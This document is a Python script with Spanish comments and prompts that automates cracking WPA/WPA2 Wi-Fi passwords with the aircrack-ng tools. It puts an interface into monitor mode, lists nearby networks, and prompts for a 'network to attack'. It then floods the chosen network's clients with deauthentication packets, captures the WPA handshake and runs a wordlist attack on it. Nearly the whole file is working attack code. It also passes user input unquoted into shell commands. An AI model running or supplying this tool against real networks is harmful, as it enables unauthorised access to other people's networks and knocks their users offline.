#!/bin/python3
import pywifi as pywifi

try:
    print("\n[*] Starting...")
    print("\n\t[*] Comprobando librerias...")
    import colorama
    from colorama import Fore
    import os
    import time
    import re
    import subprocess
    import threading
    import multiprocessing
    import os
    import argparse
    time.sleep(1)
    print(Fore.GREEN + "\n\t[*] " + Fore.YELLOW + "Librerias importadas correctamente...")

except ModuleNotFoundError as e:
    print("\n\n[!] Faltan modulos necesario para la ejecucion...\n\t%s" % e)
    print("[!] Exiting...")
    exit(1)

# Juntar con port_scan
# Añadir anilisis de WiFis

def delete_files():
    os.system("rm -r captures/* > /dev/null")
    os.system("rm -r espec/* > /dev/null")


def restart_net():
    os.system("service networking restart > /dev/null")
    os.system("service NetworkManager restart > /dev/null")
# COMPROBAR SI EL ARGUMENTO -w FUNCIONA Y SE COMPRUEBA


def exiting(err):
    if err:
        if err == "True":
            print(Fore.YELLOW + "\n[*] " + Fore.RED + "Exiting due a error...\n\n" + err)

        elif err == "done":
            print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting tool...")

    else:
        print(Fore.YELLOW + "\n\n[*] " + Fore.RED + "Exiting, Ctrl + C recived...")

    print(
        Fore.WHITE + "\n  ·  ·  ·  · " + Fore.YELLOW + "[*] " +
                        Fore.LIGHTCYAN_EX + "Restarting network services"
        + Fore.YELLOW +Fore.WHITE + "\n  ·  ·  ·  · " + "[*] " +
                        Fore.LIGHTCYAN_EX + "Stopping monitor mode..." + Fore.RESET)

    try:
        if os.system("airmon-ng stop {}mon > /dev/null".format(choosed_interface)) != 0:
            os.system("airmon-ng stop {} > /dev/null".format(choosed_interface))
    except NameError:
        pass

    print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting all capture files..."
          + Fore.RESET)

    restart_net()
    delete_files()

    print(Fore.YELLOW + "\n[!] " + Fore.GREEN + "Exit Succesfull")
    exit()


def am_i_root():

    if os.getuid() != 0:
        print(Fore.RED + "\n[!] Necesitamos ser root...")
        exit(1)


def check_utilities():
    non_installed = {}
    tools = 0

    print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Comprobando herramientas necesarias...\n")

    # Comprobamos todas la herramientas...
    if os.system("command -v airmon-ng > /dev/null") != 0:
        non_installed["airmon-ng"] = False
    else:
        non_installed["airmon-ng"] = True

    if os.system('command -v aircrack-ng > /dev/null') != 0:
        non_installed["aircrack-ng"] = False
    else:
        non_installed["aircrack-ng"] = True

    if os.system('command -v aireplay-ng > /dev/null') != 0:
        non_installed["aireplay-ng"] = False
    else:
        non_installed["aireplay-ng"] = True

    if os.system('command -v airodump-ng > /dev/null') != 0:
        non_installed["airodump-ng"] = False
    else:
        non_installed["airodump-ng"] = True

    for tool in non_installed:
        time.sleep(0.4)
        if not non_installed[tool]:
            print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[!] " + Fore.LIGHTCYAN_EX +
                  "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " no está instalada.")

        elif non_installed[tool]:
            print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX +
                  "La herramienta " + Fore.GREEN + f"{tool}" + Fore.LIGHTCYAN_EX + " está instalada.")
            tools += 1

    if tools != 4:
        print(Fore.RED + "\n[!] " + Fore.YELLOW +
              "Es necesario contrar con todas las herramientas para ejecutar el script...")
    else:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Las dependencias están intstaladas... \n")
        time.sleep(1)


def kill_conects():
    # Matamos todas las conexiones
    os.system("airmon-ng check kill > /dev/null")


def monitor_mode(choosed_interface):
    global interface
    interface = re.findall("^[a-z]+[0-9]+mon", choosed_interface + "mon")[0]
    os.system("airmon-ng start %s > /dev/null" % choosed_interface)
    os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' > espec/mode".format(interface))

    with open("espec/mode", "r") as mde:
        mode = mde.read()
    mode = re.findall("Mode:([A-Z][a-z]+)", mode)
    try:
        if mode[0] != "Monitor":
            return 1
        else:
            return 0
    except IndexError as err:
        exiting(err)


def list_save_interf():
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "Mostrando Intefaces Disponibles...")

    direc = "espec"

    if not os.path.exists(direc):
        os.makedirs(direc)
    time.sleep(1)
    # Creamos archivo con interfaces disponibles
    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > espec/iface")
    nums = 0
    with open("espec/iface", "r") as ifaces:
        ifa = ifaces.read()
    ifaces = ifa.split("\n")

    for iface in ifaces:
        if not iface:
            continue
        nums += 1
        print(Fore.YELLOW + f"\n\t{nums})." + Fore.BLUE + " {}".format(iface))

    global choosed_interface
    choosed_interface = None

    while not choosed_interface:
        choosed_interface = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Nombre de la interfaz (E.j wlan0): ")
        if choosed_interface not in ifaces:
            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La interfaz {} no existe".format(choosed_interface))
            choosed_interface = None
        else:
            if os.system("airmon-ng | grep {} > /dev/null".format(choosed_interface)):
                print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La interfaz " + Fore.BLUE + f"{choosed_interface}" +
                      Fore.RED + " no compatible...")
                choosed_interface = None

    init_start_attack(choosed_interface)


def init_start_attack(choosed_interface):

    print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Preparing...")

    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW + "Matando todas las conexiones...")
    kill_conects()
    time.sleep(1)
    print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
          "Estableciendo " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW + " en modo monitor..."
          + Fore.RESET)

    if monitor_mode(choosed_interface) == 0:
        print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.YELLOW +
              "Interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
              " establecida en modo monitor correctamente")
        prepared = True
    else:
        print(Fore.RED + "\n\t[" + Fore.YELLOW + "V" + Fore.RED + "] " + Fore.YELLOW +
              "La interfaz " + Fore.LIGHTCYAN_EX + f"{choosed_interface}" + Fore.YELLOW +
              " no se ha establecido en modo monitor correctamente...")
        exiting(err=True)
        prepared = False

    if prepared:
        print(Fore.YELLOW + "\n[*] " + Fore.BLUE + "Prepared to start capturing data...")


def get_options(args):
    hand = subprocess.Popen(["airodump-ng", f"{interface}"], stdout=subprocess.PIPE)

    all_got = []
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop..." + Fore.RESET)
    input(Fore.LIGHTRED_EX + "\n\t\t[ENTER] To continue")
    while True:
        try:
            output = hand.stdout.readline()
            if not output:
                break
            all_got.append(output)
            print(output.decode().strip())
        except KeyboardInterrupt:
            break
    print(Fore.LIGHTCYAN_EX + "\n\n[*] " + Fore.RESET + "Ended session of capture data...")
    print(Fore.BLUE + "\n\t[T] " + Fore.YELLOW + "Packets captured...")
    process_data(all_got, args)


def process_data(all_got, args):
    dict = {}
    print(Fore.BLUE + "\n\t[Y] " + Fore.YELLOW + "Processing data")
    time.sleep(1)

    with open("espec/data", "wb") as data:
        for line in all_got:
            data.write(line)

    # Filtramos el archivo
    os.system('cat espec/data | grep -oP "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | sort -u > espec/bssid')

    # Abriumos el arhivo de bssids
    with open("espec/bssid", "rb") as bssids:
        bssids = (bssids.read()).decode()
    bssids = bssids.split("\n")

    for bssid in bssids:
        if not bssid:
            continue
        os.system("cat espec/data | grep {} | sort -u > espec/{}".format(bssid, bssid))

        with open("espec/"+bssid, "rb") as all_data:
            all_data = all_data.read()
        data = all_data.decode().split()

        obetives = []
        num = 0

        for itera in data:
            num += 1
            if itera not in obetives:
                obetives.append(itera)

        info = "  ".join(obetives)

        if re.findall("-[0-9]+", info):
            encription = re.findall("WPA[0-9]  [A-Z]+  +[A-Z]+", info)

            if not encription:
                continue

            channel = info.split()[info.split().index("WPA2") - 2]
            name = info.split()[info.split().index("WPA2") + 3]

            dict[name] = {"bssid": bssid,
                          "encription_type": encription[0],
                          "channel": channel}

        else:
            continue
    print_process_data(dict, args)


def print_process_data(dict, args):
    print(Fore.LIGHTCYAN_EX + "\n[" + Fore.RED + "V" + Fore.LIGHTCYAN_EX + "] " + Fore.YELLOW +
          "Listing aviable networks to attack...")

    # Asingamos variables necesarias
    net = 0

    print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Preparing information for networks...".format(net)
          + Fore.RESET)
    for network in dict:
        net += 1
        time.sleep(0.5)

        print(Fore.YELLOW + f"\n\t{net}.[*] " + Fore.RED + "Name -> " + Fore.GREEN + "{}\n".format(network) +
               "\n\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "BSSID -> " + Fore.GREEN + "{}"
               .format(dict[network]['bssid']) +

               "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}"
               .format(dict[network]['channel']) +

               "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}"
               .format(dict[network]["encription_type"]))

    network_to_attack = None
    while not network_to_attack:
        network_to_attack = input(Fore.YELLOW + "\n[!>] " + Fore.WHITE + "Network to attack (E.j 'MOVISTAR_XXXX'): ")

        if network_to_attack not in dict:
            print(Fore.YELLOW + "\n\t[!] " + Fore.RED + "La red {} no existe..".format(network_to_attack))
            network_to_attack = None
        else:
            print(Fore.YELLOW + "\n\t[*] " + Fore.LIGHTCYAN_EX + "Red encontrada!")
            time.sleep(0.5)
            print(Fore.LIGHTCYAN_EX + "\n[*] " + Fore.YELLOW + "Preparando entorno...")
            prepare_attack(dict, network_to_attack, args)


def prepare_attack(dict, network_to_attack, args):
    file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + Fore.LIGHTCYAN_EX +
                                                    "Enter the name of the file to save [E.j capture1] > ")

    # Definimos bssid y channel
    bssid = dict[network_to_attack]['bssid']
    ch = dict[network_to_attack]['channel']

    # Leer handshake
    direc = "captures/" + bssid

    if not os.path.exists(direc):
        os.makedirs(direc)
    time.sleep(1)
    print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
          Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
          Fore.YELLOW + "ESPERE... --->  " + Fore.LIGHTCYAN_EX + "[CTRL + C] to stop manually..." + Fore.RESET)

    input(Fore.YELLOW + "\n\t\t[ENTER] To continue\n")


    # Preparamos multiproceso para poder pararlos todos a la vez
    #deauth = multiprocessing.Process(target=deauth_clients(bssid))


    # Preparamos subproceso de capture hand
    capture = multiprocessing.Process(target=capture_handshake(direc, args, bssid, ch, file))

    # Iniciamos la captura del handshake y envio de deauth
    capture.start()
    #deauth.start()

    # Juntamos para detener
    capture.join()
    #deauth.join()


"""def deauth_clients(bssid):
    # Enviar paquetes "deauth"
"""


def capture_handshake(direc, args, bssid, ch, file):

    hand = subprocess.Popen(["airodump-ng", "-w", "./captures/{}/".format(bssid) + file, "-c", ch, "--bssid", bssid,
                             f"{interface}"], stdout=subprocess.PIPE)

    subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.PIPE)
    done = False
    while True:
        try:
            output = hand.stdout.readline()

            print(output.decode().strip())
            if "WPA handshake:".encode() in output:
                done = True
                break

        except KeyboardInterrupt:
            break

    print(Fore.LIGHTCYAN_EX + "\n\n\n\n\n\n\n\n\n\n\n\n[T] " + Fore.YELLOW + "Comprobando captura de hanshake")
    if done:
        print(Fore.LIGHTYELLOW_EX + "\n\t[V] " + Fore.CYAN + "Handskake capturado...\n\n")
    else:
        print(Fore.RED + "\n\t[T] " + Fore.YELLOW + "Hanshake no capturado...")
        exiting(err=True)
    crack_handshake(direc, args)


def find_wordlists(wordlists):
    found = os.system("find {} > /dev/null".format(wordlists))
    while found != 0:
        print(Fore.YELLOW + "[!] " + Fore.RED + "Diccionario no encontrado, introduzca la ruta completa...")
        wordlists = input(Fore.YELLOW + "\n\t[!>] " + Fore.WHITE)
        found = os.system("find {}  > /dev/null".format(wordlists))

    return wordlists


def crack_handshake(direc, args):
    # Buscamos arhchivo .cap
    os.system("find {}/*.cap > espec/capture_file ".format(direc))

    # Comprobamos si nos ha pasasdo discionario y si existe en su sistema
    wordlist = find_wordlists(args.wordlist)

    # Abrimos el capture_file donde se encuentra la ruta hacia  el .cap
    with open("espec/capture_file", "r") as file:
        file = file.read().strip()

    print(Fore.YELLOW + "\n\t[!] " + Fore.LIGHTCYAN_EX + "Abriendo archivo '.cap'\n" + Fore.RESET)
    # input(Fore.LIGHTCYAN_EX + "\n[ENTER] " + Fore.YELLOW + "To continue\n\n" + Fore.RESET)
    time.sleep(3)

    # Empezamos con el crack de la password
    crack = subprocess.Popen(["aircrack-ng", file, "-w", wordlist], stdout=subprocess.PIPE)

    # Mostramos la salida hasta que se encuentre la contraseña (o no)
    while True:
        try:
            output = crack.stdout.readline()
            if not output:
                break
            print(output.decode().strip())
        except KeyboardInterrupt:
            break


def main():
    try:
        # Recogemos argumentos
        parser = argparse.ArgumentParser()
        parser.add_argument("-w", "--wordlist", help="Use an extern wordlists dictionary", required=True)
        args = parser.parse_args()

        # Somos root?
        am_i_root()

        # Tenemos las herraientas?
        check_utilities()

        # Listamos interfaces
        list_save_interf()

        # Escanemos redes cercanas
        get_options(args)

        # Borramos datos
        exiting(err="done")

    # Salida manual
    except KeyboardInterrupt:
        exiting(err=False)

    """# Salida por error
    except Exception as e:
        exiting(err=e)"""


if __name__ == "__main__":
    main()
